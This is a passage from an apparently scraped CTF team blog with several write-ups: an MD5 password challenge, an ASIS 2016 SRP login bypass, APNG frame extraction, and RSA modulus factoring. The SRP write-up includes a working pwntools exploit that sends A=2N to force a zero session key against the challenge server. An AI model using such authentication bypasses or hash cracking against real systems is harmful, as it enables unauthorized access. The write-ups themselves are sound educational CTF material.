&amp; 63) | 128); &#125; else &#123; result.push((c &gt;&gt; 12) | 224); result.push(((c &gt;&gt; 6) &amp; 63) | 128); result.push((c &amp; 63) | 128); &#125; &#125; return result; &#125;; var x = Array(); var k, AA, BB, CC, DD, a, b, c, d; var S11 = 7, S12 = 12, S13 = 17, S14 = 22; var S21 = 5, S22 = 9, S23 = 14, S24 = 20; var S31 = 4, S32 = 11, S33 = 16, S34 = 23; var S41 = 6, S42 = 10, S43 = 15, S44 = 21; var bytes = Utf8Encode(string); x = CTWA(bytes); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k = 0; k &lt; x.length; k += 16) &#123; AA = a; BB = b; CC = c; DD = d; a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756); c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE); a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A); c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501); a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF); c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE); a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193); c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821); a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340); c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA); a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = GG(d, a, b, c, x[k + 10], S22, 0x2441453); c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8); a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6); c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED); a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8); c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A); a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681); c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C); a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9); c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70); a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA); c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05); a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5); c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665); a = II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97); c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039); a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92); c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1); a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0); c = II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1); a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235); c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391); a = AU(a, AA); b = AU(b, BB); c = AU(c, CC); d = AU(d, DD); &#125; var temp = WordToHex(a) + WordToHex(b) + WordToHex(c) + WordToHex(d); return temp.toLowerCase();&#125;__seceret = '622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483';var _=__=___='';for (var i = 0; i &lt; __seceret.length; i+=3) &#123; _+=__seceret[i+0]; __+=__seceret[i+1]; ___+=__seceret[i+2];&#125;var h = prompt(\"Please enter your passowrd\");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; I’ve seen this before and realized this was almost the same challenge it happened in trend micro ctf about 1 year ago, which for coincidence did a write up for it! you can check it up here https://kinyabitch.wordpress.com/2016/07/31/ctf/.Doing a fast analysis to the code we can see that the “generate function” is actually an known hash function which you could quickly find it by just searching it on google to identify it as md5 and find it in places like this https://gist.github.com/nduphuong/752463 1234567891011121314__seceret = '622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483';var _=__=___='';for (var i = 0; i &lt; __seceret.length; i+=3) &#123; _+=__seceret[i+0]; __+=__seceret[i+1]; ___+=__seceret[i+2];&#125;var h = prompt(\"Please enter your passowrd\");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; Now analysing the rest of the code we can see that variable seceret is splited into 3 variables “_”, ““ and “___”. If you ran this code on your browser you could easily find the values of these 3 variables instead of doing the calculations: 1234_ = 6b07fd4ea837c39e1542e1bbca01a224 __ = 20ee80e63596799a1543bc9fd88d8878 ___ = 21232f297a57a5a743894a0e4a801fc3 This are obviously md5 hashes now cracking them(john the ripper, hashcat or even searching the hashes on google) will get: 12346b07fd4ea837c39e1542e1bbca01a224 -&gt; tunisia20ee80e63596799a1543bc9fd88d8878 -&gt; bunny21232f297a57a5a743894a0e4a801fc3 -&gt; admin 123456if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; Analysing the password verification we can see that the that instruction to be true we will need those strings concatenation be our cracked hashes: 1234h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13] = 't'+'u'+'n'+'i'+'s'+'i'+'a';h[15]+h[10]+h[3]+h[5]+h[6] = 'b'+'u'+'n'+'n'+'y';h[16]+h[12]+h[14]+h[2]+h[7] = 'a'+'d'+'m'+'i'+'n'; Now reordering the string from the index 0 to 16 we get “inininynusutdamba”. We can conclude that is the password to be entered into the prompt, after submitting it the flag showed up at the webpage.","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"md5","slug":"md5","permalink":"https://teamrocketist.github.io/tags/md5/"}]},{"title":"[Crypto] ASIS CTF Finals 2016 - SRPP [Secure Remote Password Protocol]","slug":"Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol","date":"2016-09-14T03:12:59.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/","link":"","permalink":"https://teamrocketist.github.io/2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/","excerpt":"","text":"Average: 2.83Rating Count: 12You Rated: Not ratedPoints231Solves35CategoryCryptoDescription Try to crack our super safe cryptography system and find the flag. nc srpp.asis-ctf.ir 22778http://asis-ctf.ir/tasks/srpp.txz_baa9ec300fd3488a8417fc849a07c2aaf5a26224 Server.py (given by the challenge) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#!/usr/bin/python# -*- coding: UTF-8 -*-import socketimport time from hashlib import *from thread import *from Crypto.Util.number import *from os import urandomfrom random import *from string import *from secret import password, flag_port = int(sys.argv[1])_timeout = 3 _host = ''_bufsize = 4096_logfile = open(str(sys.argv[0]) + '.log', 'a')_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.bind((_host, _port))_socket.listen(_bufsize)_taskname = 'SRPP'_hash = 'sha512'def Hash(*args): a = ':'.join(str(a) for a in args) return int(sha256(a).hexdigest(), 16)def getParams(nbit): N = getPrime(nbit) g = 2 k = Hash(N, g) return(N, g, k)def clientThread(client): client.send('Bot detection: Are you ready?' + '\\n') A = ''.join([choice(printable[:62]) for x in range(26)]) print A[:4] msg = 'ASIS needs proof of work to start the ' + _taskname + ' challenge.\\n' + _hash.upper() + '(X + \"%s\").hexdigest() = \"%s...\",\\nX is an alphanumeric string and |X| = 4\\nEnter X: ' % (A[4:], sha512(A).hexdigest()[:32]) client.send(msg) X = client.recv(_bufsize).strip() if sha256(X + A[4:]).hexdigest() == sha256(A).hexdigest(): client.settimeout(_timeout) client.send('Good work, Let\\'s Go!' + '\\n') nbit = 1024 params = getParams(nbit) N, g, k = params email = 'admin@asis-ctf.ir' client.send('Please login as \"admin@asis-ctf.ir\" and get the flag:' + '\\n') client.send('Sever is generating the parameters ...' + '\\n') client.send('params = (N, g, k) = ' + str(params) + '\\n') salt = urandom(32) N, g, _ = params x = Hash(salt, email, password) verifier = pow(g, x, N) while True: try: client.send('Send the email address and the public random positive value A seperated by \",\" as \"email, A\": ' + '\\n') ans = client.recv(_bufsize).strip() print ans try: email, A = ans.split(',') A = int(A) assert (A != 0 and A != N), client.send('Are you kidding me?! :P' + '\\n') assert email == 'admin@asis-ctf.ir', client.send('You should login as admin@asis-ctf.ir' + '\\n') b = getRandomRange(1, N) B = (k * verifier + pow(g, b, N)) % N client.send('(salt, public_ephemeral) = (%s, %d) \\n' % (salt.encode('base64')[:-1], B)) print gmpy.invert(B) u = Hash(A, B) client.send('Send the session key: ' + '\\n') K_client = client.recv(_bufsize).strip() assert K_client.isdigit(), client.send('Please send a valid positive integer as session key.' + '\\n') K_client = int(K_client) S_s = pow(A * pow(verifier, u, N), b, N) K_server = Hash(S_s) client.send('Send a POC of session key: ' + '\\n') M_client = client.recv(_bufsize).strip() assert M_client.isdigit(), client.send('Please send valid positive integer as POC.' + '\\n') M_client = int(M_client) assert (K_server == K_client), client.send('The session key is not correct!' + '\\n') assert (M_client == Hash(Hash(N) ^ Hash(g), Hash(email), salt, A, B, K_client)), client.send('The POC is not correct!' + '\\n') M_server = Hash(A, M_client, K_server) # TODO: check server POC in clinet side client.send('Great, you got the flag: ' + flag + '\\n') client.close() break except: client.send('Provided input is not valid.' + '\\n') client.send('Quiting ...' + '\\n') client.close() break except socket.timeout: client.send('Timeout! Plase send faster ... \\n') client.close() break else: client.send('Sorry, Bad proof of work! \\n') client.close()while True: client, addr = _socket.accept() start_new_thread(clientThread ,(client,))s.close() To solve this you needed to realise that A = 2N ≡ 0 (mod N). The web server was checking only for values like A = 0 or A = N. To beat the system you only need to set the A to A = 2N and set the session key to 0 and hash it: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import refrom pwn import *from string import *from hashlib import *from os import urandomfrom itertools import productfrom Crypto.Util.number import *def Hash(*args): a = ':'.join(str(a) for a in args) return int(sha256(a).hexdigest(), 16)def is_solution(s, sol): return sol == sha512(s).hexdigest()[:32]def parse(s): #m = re.search('\\\"[a-zA-Z0-9]*\\\"', s) m = re.findall(r'\\\"[a-zA-Z0-9.]*\\\"', s) salt = m[0][1:-1] first16bytes = m[1][1:-4] return salt, first16bytesdef regex_parse(regex, s): m = re.findall(regex, s) return mdef bot_system(junk): salt, sol = parse(junk) chars = digits + ascii_uppercase + ascii_lowercase for n in range(4, 4 + 1): for comb in product(chars, repeat=n): x = ''.join(comb) if is_solution(x.rstrip() + salt.rstrip(), sol): r.sendline(x) return r.recvuntil(\"Send the email address and the public random positive value A seperated by \\\",\\\" as \\\"email, A\\\":\") r.sendline(\"2ewq\") return r.recvline()if __name__ == '__main__': email = 'admin@asis-ctf.ir' context(arch='i386', os='linux') r = remote('srpp.asis-ctf.ir', 22778) junk = r.recvuntil('Enter X:') print junk junk = bot_system(junk) print junk N, g, k = regex_parse(r\"[0-9]+\", junk) A = 2 * long(N) r.sendline('%s,%d' % (email, A)) junk = r.recvuntil(\"Send the session key:\") print junk salt, B = regex_parse( r'(?:[A-Za-z0-9+/]&#123;4&#125;)&#123;2,&#125;(?:[A-Za-z0-9+/]&#123;2&#125;[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==|[0-9]+)', junk) x = Hash(salt.decode('base64'), email, 'x') u = Hash(A, B) K_client = str(Hash(0)) r.sendline(K_client) junk = r.recvuntil(\"Send a POC of session key:\") print junk M_client = Hash(Hash(long(N)) ^ Hash(long(g)), Hash(email), salt.decode('base64'), long(A), long(B), K_client) r.sendline(str(M_client)) junk = r.recvall(timeout=3) print junk # r.sendline(321) # print r.recvall(timeout=2) Requirements to run the code above: capstone==3.0.4cffi==1.8.2cryptography==1.5enum34==1.1.6idna==2.1ipaddress==1.0.17Mako==1.0.4MarkupSafe==0.23paramiko==2.0.2pluggy==0.3.1psutil==4.3.1pwn==1.0pwntools==3.0.2py==1.4.31pyasn1==0.1.9pycparser==2.14pycrypto==2.6.1pyelftools==0.24Pygments==2.1.3pyserial==3.1.1PySocks==1.5.7python-dateutil==2.5.3requests==2.11.1ROPGadget==5.4six==1.10.0tox==2.3.1virtualenv==15.0.3 Running it: 12345678910111213141516171819202122(env)kinyabitch@Debian ~/h/c/a/c/SRPP&gt; python srpp.py[+] Opening connection to srpp.asis-ctf.ir on port 22778: DoneBot detection: Are you ready?ASIS needs proof of work to start the SRPP challenge.SHA512(X + \"Qdir2gMmUNfQTEWws7TiiC\").hexdigest() = \"6ab9e49f8f1666eedbfcd245641494b5...\",X is an alphanumeric string and |X| = 4Enter X: Good work, Let's Go!Please login as \"admin@asis-ctf.ir\" and get the flag:Sever is generating the parameters ...params = (N, g, k) = (150264492626393812114930741471401106498656623083068639913262819178319899775751847281352721734537734815860211276875675213404746620022806433472801532459549667439961097968054640742518648454976403201201715934962422442028556067288440471827328146158430586959765296795581920036648128166307787893201848761850772213819L, 2, 24575437478632421856161724587288271515505936432761108412190739330057705715583L)Send the email address and the public random positive value A seperated by \",\" as \"email, A\": (salt, public_ephemeral) = (xqP2u8/GnuOlvvwzqQyDSCzKdub3VSlC7hqSVgViCn0=, 58941979940718432698750128575222177241044268927849539714742170613086773456642367825722147824342183209059606531876412131592206870210224884096962602048579555044090406168925997732687622279935969221985354817678067387309953487365627666658193178058756987452583249987259227031087509426824835666790488037514334092494) Send the session key: Send a POC of session key:[+] Receiving all data: Done (66B)[*] Closed connection to srpp.asis-ctf.ir port 22778 Great, you got the flag: ASIS&#123;7bdb4b540699ef341f4a3b32469cd3f6&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"login","slug":"login","permalink":"https://teamrocketist.github.io/tags/login/"}]},{"title":"[Forensics] ASIS CTF finals 2016 - p1ng","slug":"Forensics-ASIS-CTF-finals-2016-p1ng","date":"2016-09-14T02:33:03.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/","link":"","permalink":"https://teamrocketist.github.io/2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/","excerpt":"","text":"Average: 3.60Rating Count: 5You Rated: Not ratedPoints121Solves24CategoryForensicDescription p1ng is ASIS hand-drawn PNG.http://asis-ctf.ir/tasks/p1ng.txz_76eca77720a65d95557a3850929abd0a8a18c636 We have a png file inspecting with binwalk we can see this strange compressed data: 1234567891011121314151617181920212223242526272829kinyabitch@Debian ~/h/c/a/f/p1ng&gt; binwalk p1ng/p1ngDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 180 x 76, 8-bit/color RGBA, non-interlaced99 0x63 Zlib compressed data, best compression4987 0x137B Zlib compressed data, best compression9484 0x250C Zlib compressed data, best compression17713 0x4531 Zlib compressed data, best compression22512 0x57F0 Zlib compressed data, best compression29380 0x72C4 Zlib compressed data, best compression36947 0x9053 Zlib compressed data, best compression43723 0xAACB Zlib compressed data, best compression51878 0xCAA6 Zlib compressed data, best compression58000 0xE290 Zlib compressed data, best compression65549 0x1000D Zlib compressed data, best compression72231 0x11A27 Zlib compressed data, best compression79133 0x1351D Zlib compressed data, best compression85159 0x14CA7 Zlib compressed data, best compression92012 0x1676C Zlib compressed data, best compression98842 0x1821A Zlib compressed data, best compression105524 0x19C34 Zlib compressed data, best compression113043 0x1B993 Zlib compressed data, best compression119801 0x1D3F9 Zlib compressed data, best compression127259 0x1F11B Zlib compressed data, best compression134259 0x20C73 Zlib compressed data, best compression139926 0x22296 Zlib compressed data, best compression146983 0x23E27 Zlib compressed data, best compression if we inspect with a hex editor or even easier using pngsplit to split the png chunks we can find some unusual type chunks like fdAT, fcTL and acTL: 123456kinyabitch@Debian ~/h/c/a/f/p1ng&gt; ls p1ng/qwe/p1ng.0000.sig p1ng.0004.IDAT p1ng.0008.fdAT p1ng.0012.fdAT p1ng.0016.fdAT p1ng.0020.fdAT p1ng.0024.fdAT p1ng.0028.fdAT p1ng.0032.fdAT p1ng.0036.fdAT p1ng.0040.fdAT p1ng.0044.fdAT p1ng.0048.fdATp1ng.0001.IHDR p1ng.0005.fcTL p1ng.0009.fcTL p1ng.0013.fcTL p1ng.0017.fcTL p1ng.0021.fcTL p1ng.0025.fcTL p1ng.0029.fcTL p1ng.0033.fcTL p1ng.0037.fcTL p1ng.0041.fcTL p1ng.0045.fcTL p1ng.0049.IENDp1ng.0002.acTL p1ng.0006.fdAT p1ng.0010.fdAT p1ng.0014.fdAT p1ng.0018.fdAT p1ng.0022.fdAT p1ng.0026.fdAT p1ng.0030.fdAT p1ng.0034.fdAT p1ng.0038.fdAT p1ng.0042.fdAT p1ng.0046.fdATp1ng.0003.fcTL p1ng.0007.fcTL p1ng.0011.fcTL p1ng.0015.fcTL p1ng.0019.fcTL p1ng.0023.fcTL p1ng.0027.fcTL p1ng.0031.fcTL p1ng.0035.fcTL p1ng.0039.fcTL p1ng.0043.fcTL p1ng.0047.fcTL After some search on google I found this links https://wiki.mozilla.org/APNG_Specification and http://fileformats.wikia.com/wiki/Animated_Portable_Network_Graphics , this is a APNG it’s a png but animated! So our job here is to split the animation images and then maybe we can find the flag. There is a lot of tools online to do this but for the curiosity I managed to write one in python, some images were broken I needed to do some adjustments to the IDHR header to fix it: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141import osimport sysimport structimport binasciidirectory = \"outp/\"signature = \"\"ihdr_header = \"\"fdat_chunk = \"\"idat_chunk = \"\"iend_chunk = \"\"ihdrs = []parts = []PNG_SIGN = b\"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\"def is_png(png): \"\"\"Test if @png is valid png file by checking signature @png can be str of the filename, a file-like object, or a bytes object. \"\"\" if isinstance(png, str): with open(png, \"rb\") as f: png = f.read(8) if hasattr(png, \"read\"): png = png.read(8) return png[:8] == PNG_SIGNdef chunks(png): \"\"\"Yield chunks from png. @png can be a string of filename, a file-like object, or a bytes bject. \"\"\" if not is_png(png): # convert to png if isinstance(png, bytes): with io.BytesIO(png) as f: with io.BytesIO() as f2: PIL.Image.open(f).save(f2, \"PNG\", optimize=True) png = f2.getvalue() else: with io.BytesIO() as f2: PIL.Image.open(png).save(f2, \"PNG\", optimize=True) png = f2.getvalue() if isinstance(png, str): # file name with open(png, \"rb\") as f: png = f.read() if hasattr(png, \"read\"): # file like png = png.read() return chunks_read(png)def make_chunk(type, data): \"\"\"Create chunk with @type and chunk data @data. It will calculate length and crc for you. Return bytes. @type is str and @data is bytes. \"\"\" out = struct.pack(\"!I\", len(data)) data = type.encode(\"latin-1\") + data a = '%08x' % (binascii.crc32(data) % (1&lt;&lt;32)) out += data + a.decode('hex') return outdef chunks_read(b): \"\"\"Parse PNG bytes into different chunks, yielding (type, data). @type is a string of chunk type. @data is the bytes of the chunk. Including length, type, data, and crc. \"\"\" # skip signature i = 8 # yield chunks while i &lt; len(b): data_len, = struct.unpack(\"!I\", b[i:i + 4]) type = b[i + 4:i + 8].decode(\"latin-1\") yield type, b[i:i + data_len + 12] i += data_len + 12# 6 if __name__ == '__main__': i = 0 t = 0 frame_chunks = [] frames = [] for ctype, data in list(chunks('p1ng/p1ng')): if ctype == \"IHDR\": ihdr_header = data hdr = ihdr_header elif ctype == \"acTL\": # ignore Animation Control Chunk continue elif ctype == \"fcTL\": # https://wiki.mozilla.org/APNG_Specification#.60fcTL.60:_The_Frame_Control_Chunk \"\"\" \"\"\" c = struct.unpack(\"!IIIIHHbb\", data[12:-4]) width = 180 height = 76 if i in [11,12,13,2,9]: width = c[0] height = c[1] if i in [7,13,21,22]: width -= 1 #height = c[1] if i == 6: width -= 2 print c ihdr = make_chunk(\"IHDR\", struct.pack(\"!II\", width + c[2], height+ c[3]) + hdr[16:-4]) ihdrs.append(ihdr) #i += 1 elif ctype == \"IDAT\": parts.append((\"IDAT\", data)) i += 1 elif ctype == \"fdAT\": # https://wiki.mozilla.org/APNG_Specification#.60fdAT.60:_The_Frame_Data_Chunk parts.append((\"IDAT\", make_chunk(\"IDAT\", data[12:-4]))) i += 1 elif ctype == \"IEND\": iend_chunk= data break if not os.path.exists(directory): os.makedirs(directory) for i in range(len(parts)): #parts[i] = PNG_SIGN + parts[0] + pallets[i] + parts[i] + parts[-1] f = open(directory + 'p1ng%d.png' % i, 'w+') if i == 0: ihdrs[i] = ihdr_header f.write(PNG_SIGN + ihdrs[i] + parts[i][1] + iend_chunk) f.close() After running the script you can get 22 imgs splited into a directory, after joining them you can construct the flag:ASIS{As_l0n9_4s_CTF_3x1sts_th3r3_w1ll_b3_ASIS_4nd_4s_l0n9_4s_ASIS_3x1sts_th3r3_w1ll_b3_PNG!}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"png","slug":"png","permalink":"https://teamrocketist.github.io/tags/png/"}]},{"title":"ASIS CTF finals - RSA","slug":"ASIS-CTF-finals-RSA","date":"2016-09-11T17:23:20.000Z","updated":"2018-10-24T23:21:04.826Z","comments":true,"path":"2016/09/11/ASIS-CTF-finals-RSA/","link":"","permalink":"https://teamrocketist.github.io/2016/09/11/ASIS-CTF-finals-RSA/","excerpt":"","text":"Average: 4.18Rating Count: 22You Rated: Not ratedPoints113Solves64CategoryCryptoDescriptionFind the flag.http://asis-ctf.ir/tasks/rsa.txz_93b525e771c284b7a3f0bb45b290ce56987c5834 After extracting analysing the server.py file 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/pythonimport gmpyfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5flag = open('flag', 'r').read() * 30def ext_rsa_encrypt(p, q, e, msg): m = bytes_to_long(msg) while True: n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2)p = getPrime(128)q = getPrime(128)n = p*qe = getPrime(64)pubkey = RSA.construct((long(n), long(e)))f = open('pubkey.pem', 'w')f.write(pubkey.exportKey())g = open('flag.enc', 'w')g.write(ext_rsa_encrypt(p, q, e, flag)) Looks like a simple RSA encryption there are some strange things hapening here like the While True look with a try catch and “open(‘flag’, ‘r’).read() * 30”, we will see why this happens later right now we need to get our modulus N and e from the pubkey.pem file: 1234567891011121314(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; openssl rsa -in pubkey.pem -pubin -text -modulusPublic-Key: (256 bit)Modulus: 00:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20:61:b9Exponent: 12405943493775545863 (0xac2ac3e0ca0f5607)Modulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9writing RSA key-----BEGIN PUBLIC KEY-----MEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhANjiTBK3uZ7+CpvASmo99YoqlEJptJK3N23xKQI/IGG5AgkArCrD4MoPVgc=-----END PUBLIC KEY----- Now that we have the modulus and the Exponent we will try to factor modulus N with yafu (https://github.com/DarkenCode/yafu): 123456789101112131415161718192021222324(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt;; ../../../../../crl/RSA2/bin/yafu \"factor(0xD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9)\" -threads 10fac: factoring 98099407767975360290660227117126057014537157468191654426411230468489043009977fac: using pretesting plan: normalfac: no tune info: using qs/gnfs crossover of 95 digitsstarting SIQS on c77: 98099407767975360290660227117126057014537157468191654426411230468489043009977==== sieving in progress (10 threads): 36224 relations needed ======== Press ctrl-c to abort and save state ====SIQS elapsed time = 1.9290 seconds.Total factoring time = 2.0017 seconds***factors found***P39 = 315274063651866931016337573625089033553P39 = 311155972145869391293781528370734636009ans = 1 Now that we have the p and q we can get the private key using rsatool(https://github.com/ius/rsatool) 12345678(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; rsatool/rsatool.py -p 311155972145869391293781528370734636009 -q 315274063651866931016337573625089033553 -e 12405943493775545863 -o priv.key(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; cat priv.key -----BEGIN RSA PRIVATE KEY-----MIGwAgEAAiEA2OJMEre5nv4Km8BKaj31iiqUQmm0krc3bfEpAj8gYbkCCQCsKsPgyg9WBwIgHtnKUU3mNRl9yzxb34oYadECnCy7c1afLXiBA6d8n7cCEQDqFnXdoXEPZrAQBssgWxvpAhEA7S+Tc+wBhnqru7wF2RkFUQIQNRmCtiEP0S+6uyda8zCbJwIRAJ5Uoh8oF1sz+8MdyveAYncCEB/QjyrzneAoX5X8HRjafQM=-----END RSA PRIVATE KEY----- And now writing a little script with python to decrypt our cipher text: 1234567891011121314151617181920from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEPfrom base64 import b64decodefrom Crypto.Hash import SHAfrom Crypto import Randomimport subprocessimport sysdef decrypt_RSA(privkey,message): key = open(privkey, \"r\").read() dsize = SHA.digest_size sentinel = Random.new().read(15+dsize) rsakey = RSA.importKey(key) rsakey = PKCS1_v1_5.new(rsakey) decrypted = rsakey.decrypt(b64decode(message), None) return decryptedprint decrypt_RSA('priv.key', sys.argv[1]) 12345678910(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py $(cat flag.enc | tr -d '\\n')Traceback (most recent call last): File \"rsa2.py\", line 20, in &lt;module&gt;; print decrypt_RSA('priv.key', sys.argv[1]) File \"rsa2.py\", line 16, in decrypt_RSA decrypted = rsakey.decrypt(b64decode(message), None) File \"/home/kinyabitch/ctf/asis-2016/ppc/SecuPrim/.env/local/lib/python2.7/site-packages/Crypto/Cipher/PKCS1_v1_5.py\", line 204, in decrypt raise ValueError(\"Ciphertext with incorrect length.\")ValueError: Ciphertext with incorrect length. But we failed, incorrect length? remember this part of the code from server.py ? 123456789101112131415flag = open('flag', 'r').read() * 30while True: n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) key = 